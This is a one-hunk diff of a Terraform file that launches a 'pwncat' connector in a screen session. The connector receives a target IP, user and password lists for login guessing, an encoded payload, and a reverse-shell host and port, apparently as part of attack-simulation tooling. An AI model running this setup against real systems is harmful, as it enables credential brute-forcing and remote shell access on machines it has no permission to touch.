@@ -39,7 +39,7 @@ locals {
             log "starting background process via screen..."
             screen -S $PWNCAT_SESSION -X quit
             screen -wipe
-            nohup /bin/bash -c "screen -d -L -Logfile $PWNCAT_LOG -S $PWNCAT_SESSION -m python3.9 connector.py --target-ip=\"${var.inputs["target_ip"]}\" --target-port=\"${var.inputs["target_port"]}\" --user-list=\"${var.inputs["user_list"]}\" --password-list=\"${var.inputs["password_list"]}\" --task=\"${var.inputs["task"]}\" --payload=\"${base64encode(var.inputs["payload"])}\" --reverse-shell-host=\"${var.inputs["reverse_shell_host"]}\"  --reverse-shell-port=\"${var.inputs["reverse_shell_port"]}\"" >/dev/null 2>&1 &
+            screen -d -L -Logfile $PWNCAT_LOG -S $PWNCAT_SESSION -m /bin/bash -c "cd ${local.attack_dir} && python3.9 connector.py --target-ip=\"${var.inputs["target_ip"]}\" --target-port=\"${var.inputs["target_port"]}\" --user-list=\"${var.inputs["user_list"]}\" --password-list=\"${var.inputs["password_list"]}\" --task=\"${var.inputs["task"]}\" --payload=\"${base64encode(var.inputs["payload"])}\" --reverse-shell-host=\"${var.inputs["reverse_shell_host"]}\"  --reverse-shell-port=\"${var.inputs["reverse_shell_port"]}\""
             screen -S $PWNCAT_SESSION -X colon "logfile flush 0^M"
             log "connector started."
             log "starting sleep for 30 minutes - blocking new tasks while accepting connections..."
